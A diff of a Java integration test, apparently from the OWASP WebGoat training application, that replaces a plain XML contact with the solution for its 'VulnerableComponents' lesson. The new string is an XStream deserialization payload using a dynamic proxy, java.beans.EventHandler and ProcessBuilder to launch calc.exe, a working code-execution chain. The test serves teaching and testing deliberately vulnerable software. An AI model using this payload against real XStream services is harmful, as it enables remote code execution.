@@ -64,11 +64,16 @@ public class GeneralLessonTest extends IntegrationTest {
     
     @Test
     public void vulnerableComponents() {
-    	String solution = "<contact>\n" + 
-    			"    <java.lang.Integer>1</java.lang.Integer>\n" + 
-    			"    <firstName>Bruce</firstName>\n" + 
-    			"    <lastName>Mayhew</lastName>\n" + 
-    			"    <email>webgoat@owasp.org</email>\n" + 
+    	String solution = "<contact class='dynamic-proxy'>\n" + 
+    			"<interface>org.owasp.webgoat.vulnerable_components.Contact</interface>\n" + 
+    			"  <handler class='java.beans.EventHandler'>\n" + 
+    			"    <target class='java.lang.ProcessBuilder'>\n" + 
+    			"      <command>\n" + 
+    			"        <string>calc.exe</string>\n" + 
+    			"      </command>\n" + 
+    			"    </target>\n" + 
+    			"    <action>start</action>\n" + 
+    			"  </handler>\n" + 
     			"</contact>";
     	startLesson("VulnerableComponents");
         Map<String, Object> params = new HashMap<>();
